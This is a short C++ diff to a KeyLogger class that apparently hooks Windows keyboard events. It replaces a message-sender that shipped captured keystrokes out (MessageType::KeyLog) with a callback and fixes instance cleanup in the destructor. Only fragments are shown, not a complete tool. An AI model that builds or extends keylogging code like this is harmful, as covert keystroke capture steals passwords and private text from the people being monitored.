@@ -14,9 +14,9 @@ wil::unique_hhook KeyLogger::_hook;
 std::string KeyLogger::_lastWindowTitle;
 
 KeyLogger::KeyLogger(
-	IMessageSender* sender
+	const OnKeyLog& onKeyLog
 ) :
-	_sender(sender)
+	_onKeyLog(onKeyLog)
 {
 	std::lock_guard guard(_instancesLock);
 
@@ -38,7 +38,9 @@ KeyLogger::~KeyLogger()
 {
 	std::lock_guard guard(_instancesLock);
 
-	_instances.emplace_back(this);
+	std::erase_if(
+		_instances, 
+		[&](const KeyLogger* k) { return this == k; });
 
 	if (_instances.empty())
 	{
@@ -66,7 +68,7 @@ void KeyLogger::Callback(const LPARAM lParam)
 
 	for (const auto& instance : _instances)
 	{
-		instance->LogKeyboardEvent(log);
+		instance->_onKeyLog(log);
 	}
 }
 
@@ -134,13 +136,4 @@ std::string KeyLogger::FormatDate(const std::chrono::system_clock::time_point ti
 		&timeInfo);
 
 	return formattedString;
-}
-
-void KeyLogger::LogKeyboardEvent(const std::string& log) const
-{
-	Trace(log.c_str());
-
-	const auto content = SharedSpan(log);
-
-	_sender->Send(MessageType::KeyLog, content);
 }
